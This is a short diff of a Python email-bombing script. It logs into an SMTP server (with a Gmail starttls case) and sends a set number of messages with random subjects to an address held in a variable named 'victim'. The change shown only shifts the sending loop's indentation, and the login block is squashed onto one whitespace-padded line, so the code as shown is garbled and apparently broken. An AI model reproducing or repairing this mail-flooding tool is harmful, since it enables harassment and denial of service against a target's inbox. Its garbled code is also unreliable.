@@ -25,7 +25,7 @@ port = 587
 
 ##########################  Login ############################                                                                                                                                        try:                                                                                                                                                                                                      server = smtplib.SMTP(smtp_server,port)                                                                                                                                                               server.ehlo()                                                                                                                                                                                         if smtp_server == "smtp.gmail.com":                                                                                                                                                                           server.starttls()                                                                                                                                                                             server.login(user,password)
 ###################### SENDING #########################################
-    for i in range(1, number+1):
+for i in range(1, number+1):
         subject = os.urandom(9)
         msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + message
         server.sendmail(user,victim,msg)
